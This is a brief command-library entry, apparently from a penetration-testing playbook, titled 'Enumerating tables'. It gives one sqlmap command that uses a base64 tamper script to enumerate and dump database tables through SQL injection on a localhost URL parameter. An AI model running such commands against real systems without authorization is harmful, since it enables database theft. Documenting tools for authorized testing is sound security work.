---
id: 59371c9b-2bf6-47d2-b92b-b7e41acfa18f
name: Enumerating tables
type: command
executor: bash
data: sqlmap -u http://127.0.0.1:8000/?fuzz=test --tables --tamper=base64encode --dump
output: null
created_at: '2023-04-06T03:56:41.307402+00:00'
updated_at: '2023-04-06T03:56:41.317920+00:00'
---

# Enumerating tables

```bash
sqlmap -u http://127.0.0.1:8000/?fuzz=test --tables --tamper=base64encode --dump
```


